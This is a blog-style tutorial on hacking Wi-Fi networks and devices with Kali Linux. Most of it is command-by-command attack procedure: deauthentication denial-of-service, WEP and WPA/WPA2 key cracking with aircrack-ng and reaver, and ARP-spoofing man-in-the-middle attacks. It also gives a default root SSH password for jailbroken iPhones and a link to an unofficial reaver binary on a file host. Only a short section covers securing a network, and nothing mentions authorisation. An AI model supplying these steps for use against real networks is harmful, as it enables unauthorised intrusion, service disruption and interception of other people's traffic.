Title: Hacking with Kali Linux
Date: 2020-05-xx
Author: Jack McKew
Category: Software
Tags: software

This post will go into ways we can use Kali Linux to hack networks and PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: <https://www.kali.org/downloads/>.

> Thank you to Chris B for helping me with the notes in this post below!

## Network Hacking

### Networking Fundamentals

#### Checking Network Configuration

Commands to use in terminal to check network state:

- `ifconfig` for all connection states
- `iwconfig` for all **wireless** connection states

The MAC address (specified by manufacturer) will be listed in `ifconfig` under `ether`. You can alter the MAC address in memory directly by:

1. Disabling that adapter `ifconfig eth0 down`
2. Reassign a new MAC address `ifconfig eth0 hw ether 00:11:22:33:44:55`

> The MAC address will be reset upon restarting or reconnecting the device.

#### Checking Wireless Networks

We can seek out wireless networks using `airodump-ng`. Ensure that your wireless access point (typically USB device) is in monitor mode with `iwconfig wlan0 mode monitor`. Now we can listen to available networks with `airodump-ng mon0` (where `mon0` is the access point in monitor mode). To listen on a variety of bands (eg, 2.4GHz and 5GHz), use the command `airodump-ng --band abg mon0`.

#### Sniffing Data from Specific Device

To sniff data to a file, the command `airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]`. This will sniff the data being transmitted by this device, and write it to a series of files. This data can later be analysed by programs like WireShark (because the data captured is potentially encrypted).

#### DeAuthentication Attack

This is a denial of service attack, but specifically for use in a Wi-Fi context. Ensuring to run `airodump-ng` at the same time during this attack. This is achieved with `aireplay-ng` and all that is required is to know the target MAC address (which is available in generic network sniffing (see above)).

`aireplay-ng -D --deauth [#deauthPackets] -a [NetworkMAC] -c [TargetMAC] [wifi card]`

### Gaining Access

#### Cracking WEP

1. Capture a large amount of packets `airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]`
2. run `aircrack-ng [filename.cap]` (leave step 1 running in the background)
    - To connect with ascii found, copy paste and connect!
    - TO CONNECT WITH KEY FOUND!, copy the key after the text provided in the square brackets, remove the colons [:], and copy paste that number when the Wi-Fi asks for a password.
    - If the network is not busy and not enough packets are being sent force the network to make packets (see step 3 in [Fake Authentication Attack](#fake-authentication-attack))

#### Fake Authentication Attack

1. run `airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]`
2. run `aireplay-ng --fakeauth [number of times (0 for 1 time)] -D -a [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]`
    - (Note in monitor mode MAC is the first 12 digits after unspec + replace [-] with [:] )
3. make sure your associated with the network (step 2) and run `aireplay-ng --arpreplay -b [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]`
4. then run the crack `aircrack-ng [filename.cap]`

> may want to leave all 3 running at once

### Cracking WPA/WPA2

For cracking WPA or WPA2, look out for WPS, this will enable the hack to much simpler as WPS is an 8 digit pin. Otherwise same attack as [WEP](#cracking-wep), but will take longer as WPA/WPA2 were designed to solve WEP's problems, thus more secure.

> WPS is only available if the router supports WPS (and not PBS(push button authentication))

#### With WPS

1. to find all networks with WPS enabled use `wash --interface [WirelessAdapter]`
2. to attack a network with WPS: 
    1. run fake auth on the router `aireplay-ng --fakeauth [number of times (0 for 1 time)] -D -a [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]` + leave airodump-ng in background (see WEP step 1)
    2. use reaver `reaver --bssid [targetMAC] --channel [channel] --interface [WirelessAdapter] -vvv --no-associate`
        > if reaver doesn't work use this version of reaver <https://ufile.io/lro4nkdv> make sure you run `chmod +x reaver` then `./rever [your command here]`

#### Without WPS

1. monitor and write to a file
2. deauthenticate a client to capture handshake
3. create a word list:
    1. Download a word list off the internet or:
        - Crunch can be used to create a word list using `crunch [min] [max] [characters] -t [pattern] -o [filename]`
    2. Need handshake + word list to crack WPA
    3. to begin cracking the password use `aircrack-ng [.cap file] -w [wordlist]`
        - methods to speedup
            1. use online services with handshake & word list
            2. use GPU for cracking
            3. use rainbow tables
            4. pipe word list as it is being created

### Securing your Network

- Ensure WPA2 is used with a long, complex password with letters, special characters and numbers
- Change the password to the router login (typically admin, admin)
- Disable WPS
- Specify exact MAC addresses to connect (visitors won't like this)

### Post Connection Attacks

#### Discovering Devices on the Network

Need to gather information (MAC, IP etc.), there are programs that do for you = NetDiscover, Nmap.

##### NetDiscover

- to use NetDiscover `netdiscover -r [ip_range (can only access IPs on the same subnet eg. 10.0.2.xx ends at 254 so eg. 10.0.2.1/24 /24 means all IPs]`
- use your ip address with the last .xx being .1 
- if using wireless card use `-i [wirelessCard]` before `-r` or just connect to the network.
- if not finding anything try (interface only if using Wi-Fi, MUST BE IN MANAGED/AUTO MODE)
    - `netdiscover -i <interface> <gateway IP/8>`
    - `netdiscover -i <interface> <gateway IP/16>`
    - `netdiscover -i <interface> <gateway IP/24>`
- To make sure of the gateway IP address, please route -n

##### Nmap

> Zenmap is the graphical user interface of Nmap use <zenmap>

1. in the target  use your network with xx at the end eg. 10.0.2.1/24 (see above [NetDiscover](#netdiscover))
2. in the profiles there are a number of default commands to use. (ping scan might not list everything)
3. use info found to work out things eg. does this model router have any exploits or the phone brand is samsung meaning it's running on android
4. Quick Scan(profile) - also shows open ports and the services running on these ports eg. if port 80 is open a webserver is running.
5. Quick scan plus - Quick scan but also shows Operating system, device type and the programs and program versions running on the ports.

![Nmap]({static img/nmap.png})

> Fun Note: when you jailbrake an iOS device it auto installs an ssh server with default password being: alpine, and uname: root, use `ssh root@[phone/server_ip]` then enter yes and alpine

#### ARP Attack

Address Resolution Protocol (ARP) allows us to link ip addresses to MAC addresses.

- ARP request sends a signal to all clients on the network asking who has this XXX IP the IP will respond with it's MAC address
- goal is to trick the router into thinking you are the victim and the victim into thinking you are the router. (Man in the Middle)
- Use program ARPspoof `arpspoof -i [interface(wificard)] -t [clientip] [gatewayip]` and then `arpspoof -i [interface(wificard)] -t [gatewayip] [clientip]`
    - There is also a tool called bettercap (more features).
    - ARPspoof is not default installed use `apt-get update && apt-get install -y dsniff`
- Packets will be blocked by default on linux to allow packets to flow though on linux use `echo 1 > /proc/sys/net/ipv4/ip_forward` (echo 0 to revert)
